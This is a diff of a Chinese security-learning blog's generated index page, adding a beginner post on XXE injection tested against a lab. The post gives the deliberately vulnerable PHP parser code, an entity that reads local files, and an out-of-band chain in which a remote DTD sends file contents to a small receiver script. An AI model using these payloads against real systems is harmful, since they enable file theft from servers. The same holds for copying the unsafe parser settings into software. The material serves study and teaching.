@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><meta name="generator" content="Hexo 3.8.0">
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
   
 
@@ -61,6 +61,88 @@
 </header>
       <div class="outer">
         <section id="main">
+  
+    <article id="post-xxe注入入门" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/08/11/xxe注入入门/" class="article-date">
+  <time datetime="2019-08-11T08:52:31.000Z" itemprop="datePublished">2019-08-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/08/11/xxe注入入门/">xxe注入入门</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;这段时间学习了下xxe注入的一些知识，这里做下总结</p>
+<h2 id="xml语言和xxe介绍"><a href="#xml语言和xxe介绍" class="headerlink" title="xml语言和xxe介绍"></a>xml语言和xxe介绍</h2><p>&emsp;&emsp;xml是一种类似html但对闭合要求更严格的标记符号语言，主要用于数据传输。</p>
+<p>&emsp;&emsp;下面是一段xml的实例</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span><span class="comment">&lt;!--声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE data [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY file SYSTEM "file:///sys/power/image_size"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;这个文档有以下几部分，文档声明，文档定义，文档元素,第一部分是声明，之后跟着的是文档定义，<b>&lt;!DOCTYPE 文档名 [内容]&gt;</b>，文档定义中嵌套实体，文档定义内可以嵌套实体定义，格式如下，<b>&lt;!ENTITY 实体名 “内容”&gt;</b>。定义结束后由文档定义的元素作为该文档的根元素，之后的所有元素需要正确嵌套入根元素内。</p>
+<p>&emsp;&emsp;xml的实体共有五种，这里我们需要注意的主要有三种：</p>
+<ol>
+<li><p>外部实体，区别主要是是在实体名后如果跟着SYSTEM关键词，关键词后面跟着的外部文件的url，而外部实体的内容则是引用文件内的内容，可以通过&amp;实体名;的形式来引用实体。</p>
+</li>
+<li><p>内部实体 ，主要指的是在实体中嵌套另外一个实体，类似<br>于</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % param1 '&lt;!ENTITY  &amp;#37;  xxe SYSTEM "http://xxx.dtd? &amp;#37; payload;" &gt;'</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是被嵌套实体中的 % ,&lt; 等字符需要进行html实体编码，16或者8进制皆可。</p>
+</li>
+<li><p>参数实体，类似于</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">f1</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">C:</span>/<span class="attr">phpStudy</span>/<span class="attr">PHPTutorial</span>/<span class="attr">WWW</span>/<span class="attr">1.txt</span>"&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">remote</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">10.211.55.10</span>/<span class="attr">eval.dtd</span>"&gt;</span></span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>
+
+<p>参数实体的声明时的实体名前有%关键字，而引用时应用%实体名;来引用。</p>
+</li>
+</ol>
+<p>&emsp;&emsp;xxe，xxe指的是外部实体注入，上面的实体定义不仅可以定义内部实体，也可以定义外部实体，引用远端的xml中定义的实体，并解析。并且可以根据不同的协议扩展为ssrf,任意命令执行，任意文件读取，ddos等等。</p>
+<h2 id="xxe注入演示"><a href="#xxe注入演示" class="headerlink" title="xxe注入演示"></a>xxe注入演示</h2><h3 id="实验环境交代"><a href="#实验环境交代" class="headerlink" title="实验环境交代"></a>实验环境交代</h3><p>windows server 2008 r2 phpStudy php 5.3.29 libxml 2.7.8（libxml 2.9.4以及以上版本无效）</p>
+<h3 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h3><ul>
+<li>reference: <a href="https://github.com/c0ny1/xxe-lab" target="_blank" rel="noopener">https://github.com/c0ny1/xxe-lab</a> 中的php_xxe</li>
+</ul>
+<p>关键代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$USERNAME = <span class="string">'admin'</span>; <span class="comment">//账号</span></span><br><span class="line">$PASSWORD = <span class="string">'admin'</span>; <span class="comment">//密码</span></span><br><span class="line">$result = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	$creds = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">	$username = $creds-&gt;username;</span><br><span class="line">	$password = $creds-&gt;password;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($username == $USERNAME &amp;&amp; $password == $PASSWORD) &#123;</span><br><span class="line">		$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>, <span class="number">1</span>, $username);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>, <span class="number">0</span>, $username);</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">	$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>, <span class="number">3</span>, $e-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br></pre></td></tr></table></figure>
+
+<h3 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h3><p>&emsp;&emsp;先正常登录一次，抓包</p>
+<p><img src="https://i.loli.net/2019/08/11/aDtSVYlANCmpQnv.png" alt="image.png"></p>
+<p>&emsp;&emsp;可以看到这里username和password是以xml文档的形式提交的，这段文档将会被simplexml_import_dom方法解析为dom。这个过程中因为load_XML设置了LIBXML_DTDLOAD和LIBXML_NOENT，所以可以加载解析外部实体，并且会回显username。我们改包试一下。</p>
+<p><img src="https://i.loli.net/2019/08/11/v5MLWYQ368G2xK7.png" alt="image.png"></p>
+<h3 id="非回显注入"><a href="#非回显注入" class="headerlink" title="非回显注入"></a>非回显注入</h3><p>payload:<br><img src="https://i.loli.net/2019/08/11/RgrH5uMoLDVkJws.png" alt="image.png"></p>
+<p>eval.dtd:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all "&lt;!ENTITY &amp;#37; send SYSTEM 'http://127.0.0.1/2.php?file=%f1;'&gt;"&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">file_put_contents(<span class="string">"2.txt"</span>, $file);</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;这里要注意三个实体的解析顺序不能乱，读取的数据将被发送到2.php上。</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><img src="https://i.loli.net/2019/08/11/IvB56z1deUDpym7.png" alt="image.png"><br>&emsp;&emsp;首先解析eval和f1实体，解析完后继续解析error实体，报文件不存在将f1内容回带。</p>
+<h2 id="漏洞验证流程"><a href="#漏洞验证流程" class="headerlink" title="漏洞验证流程"></a>漏洞验证流程</h2><p>&emsp;&emsp;应当先验证实体是否能被解析，然后验证是否能加载外部实体，最后可以尝试是否能报错。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>&emsp;&emsp;总得来说，xxe的思路还是和sql注入有些类似，从回显的union注入到盲注，报错，结果外带，由于时间有限的缘故，只写了一文件包含的利用，不过对于入门来说，足够了。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wanghuidi.github.io/2019/08/11/xxe注入入门/" data-id="cjz70onln00017o64ye8o2q19" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xxe注入/">xxe注入</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
   
     <article id="post-文件上传漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -186,7 +268,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wanghuidi.github.io/2019/06/24/文件上传漏洞/" data-id="cjxbqkv6l00060j64ebftbanw" class="article-share-link">Share</a>
+      <a data-url="http://wanghuidi.github.io/2019/06/24/文件上传漏洞/" data-id="cjz70onmm00097o6417aiuwxx" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/文件上传/">文件上传</a></li></ul>
@@ -253,7 +335,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wanghuidi.github.io/2019/06/12/xss学习小结/" data-id="cjxbqkv6f00030j64iummnquy" class="article-share-link">Share</a>
+      <a data-url="http://wanghuidi.github.io/2019/06/12/xss学习小结/" data-id="cjz70onm400067o64oty4jzl5" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/">xss</a></li></ul>
@@ -303,7 +385,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wanghuidi.github.io/2019/06/05/sql注入初步/" data-id="cjxbqkv6200000j649x3eoe2x" class="article-share-link">Share</a>
+      <a data-url="http://wanghuidi.github.io/2019/06/05/sql注入初步/" data-id="cjz70onli00007o64foazwfwa" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
@@ -328,7 +410,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件上传/">文件上传</a></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xxe注入/">xxe注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件上传/">文件上传</a></li></ul>
     </div>
   </div>
 
@@ -338,7 +420,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/sql注入/" style="font-size: 10px;">sql注入</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/文件上传/" style="font-size: 10px;">文件上传</a>
+      <a href="/tags/sql注入/" style="font-size: 10px;">sql注入</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/xxe注入/" style="font-size: 10px;">xxe注入</a> <a href="/tags/文件上传/" style="font-size: 10px;">文件上传</a>
     </div>
   </div>
 
@@ -347,7 +429,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a></li></ul>
     </div>
   </div>
 
@@ -358,6 +440,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2019/08/11/xxe注入入门/">xxe注入入门</a>
+          </li>
         
           <li>
             <a href="/2019/06/24/文件上传漏洞/">文件上传漏洞</a>
